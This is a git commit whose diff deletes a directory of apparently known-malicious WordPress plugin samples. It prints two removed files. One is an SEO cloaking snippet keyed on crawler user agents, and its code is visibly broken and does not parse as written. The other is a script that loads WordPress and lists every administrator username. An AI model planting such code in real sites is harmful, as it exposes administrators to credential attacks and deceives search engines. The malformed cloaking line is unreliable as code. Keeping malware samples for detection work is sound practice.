6e0ca2a846e53f0d7d8f7fa05216b9750e2095ba
zhoulingtao <94233508+zhoulingtao@users.noreply.github.com>
2023-05-20 23:08:31 +0800

    Delete Known Malicious Plugins directory

--- Known Malicious Plugins/bot_seo.php
+++
@@ -1,3 +0,0 @@
-<?php
-
-(preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit/i', $_SERVER['HTTP_USER_AGENT'])) { echo "; } ?>
--- Known Malicious Plugins/user_enumeration.php
+++
@@ -1,8 +0,0 @@
-<?php
-  include_once(dirname(__file__)."../../../../wp_load.php");
-  $users = get_users(array('role'=>'administrator'));
-  echo "Admin users are <br/>";
-  foreach($users as $value) {
-    echo $value->data->user_login."<br/>";
-  }
-?>
